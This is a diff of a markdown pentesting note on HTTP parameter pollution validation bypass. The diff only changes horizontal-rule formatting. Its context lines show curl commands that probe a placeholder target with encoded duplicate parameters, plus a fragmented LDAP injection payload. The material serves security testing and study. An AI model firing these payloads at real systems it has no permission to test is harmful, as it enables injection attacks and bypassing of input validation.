@@ -16,7 +16,7 @@ linked:
 ---
 # HPP - Bypass de Validación
 
-***
+---
 
 ## Encoding Tricks (URL-encoded duplicates)
 
@@ -32,7 +32,7 @@ linked:
 | `for enc in 'a' '%61' '%2561' 'A' 'ａ' '%41'; do curl "https://target/?a=safe&$enc=evil"; done` | Bulk encoding probe | Discovery. |
 ^hpp-bypass-encoding
 
-___
+---
 
 ## Splitting Param Values
 
@@ -47,7 +47,7 @@ ___
 | `curl --data-urlencode "ldap_filter=*)(&" --data-urlencode "ldap_filter=|(uid=*))" https://target/` | LDAP filter fragmented | LDAP injection adjacent. |
 ^hpp-bypass-split
 
-___
+---
 
 ## Array Notation (`a[]=1&a[]=2`)
 
@@ -64,7 +64,7 @@ ___
 | `curl "https://target/?a=1,2,3"` (comma-delimited) | Per-app split por comma | Custom delimiter. |
 ^hpp-bypass-array
 
-___
+---
 
 ## Mixed Input Sources (Query + Body + Cookie)
 
@@ -103,4 +103,4 @@ curl -s -X POST -H "Content-Type: application/json" \
 # Compare responses → identify precedence per-stack
 ```
 
-***
+---
